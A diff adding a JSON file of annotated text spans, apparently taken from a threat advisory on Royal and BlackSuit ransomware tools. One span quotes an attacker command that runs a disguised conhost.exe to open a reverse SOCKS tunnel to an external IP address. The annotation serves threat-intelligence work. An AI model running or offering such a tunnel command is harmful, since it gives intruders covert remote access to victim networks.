@@ -1,0 +1,110 @@
+[
+  {
+    "relation_index": 0,
+    "selected_unit_ids": [
+      "u001"
+    ],
+    "selected_units": [
+      {
+        "start": 0,
+        "end": 16,
+        "text": "runanddelete.bat",
+        "line_start": 0
+      }
+    ],
+    "document_start": 15072,
+    "document_end": 15088,
+    "context_ids": [
+      "ctx3"
+    ],
+    "context_spans": [
+      {
+        "start": 14620,
+        "end": 14671,
+        "text": "Table 5: Batch Script Tools Used by Royal Operators"
+      }
+    ],
+    "review_flags": []
+  },
+  {
+    "relation_index": 1,
+    "selected_unit_ids": [
+      "u003"
+    ],
+    "selected_units": [
+      {
+        "start": 82,
+        "end": 146,
+        "text": "Royal and BlackSuit IOCs as of June 2023 (New November 13, 2023)",
+        "line_start": 82
+      }
+    ],
+    "document_start": 15154,
+    "document_end": 15218,
+    "context_ids": [
+      "ctx3"
+    ],
+    "context_spans": [
+      {
+        "start": 14620,
+        "end": 14671,
+        "text": "Table 5: Batch Script Tools Used by Royal Operators"
+      }
+    ],
+    "review_flags": []
+  },
+  {
+    "relation_index": 2,
+    "selected_unit_ids": [
+      "u007"
+    ],
+    "selected_units": [
+      {
+        "start": 264,
+        "end": 344,
+        "text": "C:\\Users\\Public\\conhost.exe client 149.28.73.161:443 R:149.28.73.161:43657:socks",
+        "line_start": 264
+      }
+    ],
+    "document_start": 15336,
+    "document_end": 15416,
+    "context_ids": [
+      "ctx3"
+    ],
+    "context_spans": [
+      {
+        "start": 14620,
+        "end": 14671,
+        "text": "Table 5: Batch Script Tools Used by Royal Operators"
+      }
+    ],
+    "review_flags": []
+  },
+  {
+    "relation_index": 3,
+    "selected_unit_ids": [
+      "u012"
+    ],
+    "selected_units": [
+      {
+        "start": 501,
+        "end": 520,
+        "text": "Ransomware Filepath",
+        "line_start": 501
+      }
+    ],
+    "document_start": 15573,
+    "document_end": 15592,
+    "context_ids": [
+      "ctx3"
+    ],
+    "context_spans": [
+      {
+        "start": 14620,
+        "end": 14671,
+        "text": "Table 5: Batch Script Tools Used by Royal Operators"
+      }
+    ],
+    "review_flags": []
+  }
+]
